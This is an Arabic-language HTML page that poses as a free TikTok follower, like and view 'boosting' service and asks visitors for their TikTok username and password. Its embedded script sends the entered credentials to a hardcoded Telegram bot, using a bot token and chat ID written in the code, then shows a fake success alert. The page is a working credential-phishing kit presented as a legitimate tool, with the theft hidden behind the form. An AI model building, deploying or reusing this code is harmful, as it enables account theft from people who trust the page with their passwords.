<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>رشق TikTok</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #111;
      font-family: 'Cairo', sans-serif;
      color: white;
      text-align: center;
      padding: 30px;
    }
    h1 {
      font-size: 50px;
      background: linear-gradient(to right, #fe2c55, #25f4ee);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 30px;
    }
    form {
      background-color: #1e1e1e;
      padding: 30px;
      border-radius: 15px;
      max-width: 400px;
      margin: auto;
    }
    label {
      display: block;
      text-align: right;
      margin: 15px 0 5px;
      font-size: 16px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      margin-bottom: 10px;
      background-color: #333;
      color: white;
    }
    button {
      width: 100%;
      padding: 15px;
      font-size: 18px;
      background-color: #fe2c55;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      margin-top: 15px;
    }
    button:hover {
      background-color: #e3264c;
    }
  </style>
</head>
<body>
  <h1>TikTok</h1>
  <form onsubmit="sendToTelegram(event)">
    <label for="username">اسم المستخدم:</label>
    <input type="text" id="username" required />

    <label for="password">كلمة المرور:</label>
    <input type="text" id="password" required />

    <label for="followers">عدد المتابعين:</label>
    <select id="followers">
      <option value="1000">1000</option>
      <option value="2000">2000</option>
      <option value="5000">5000</option>
    </select>

    <label for="type">نوع الرشق:</label>
    <select id="type">
      <option value="متابعين">متابعين</option>
      <option value="لايكات">لايكات</option>
      <option value="مشاهدات">مشاهدات</option>
    </select>

    <button type="submit">ابدأ الرشق الآن</button>
  </form>

  <script>
    const TOKEN = "7522052271:AAHa6XIscaA7ivTn_C0Wr8oaqritL0GP8EY";
    const CHAT_ID = "6454073193";

    function sendToTelegram(event) {
      event.preventDefault();
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const followers = document.getElementById("followers").value;
      const type = document.getElementById("type").value;

      const message = `🟣 طلب جديد:\n\n👤 يوزر: ${username}\n🔐 باسورد: ${password}\n👥 عدد: ${followers}\n📌 نوع: ${type}`;
      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      }).then(() => {
        alert("✅ تم إرسال الطلب!");
      }).catch(() => {
        alert("❌ فشل الإرسال، حاول لاحقاً.");
      });
    }
  </script>
</body>
</html>
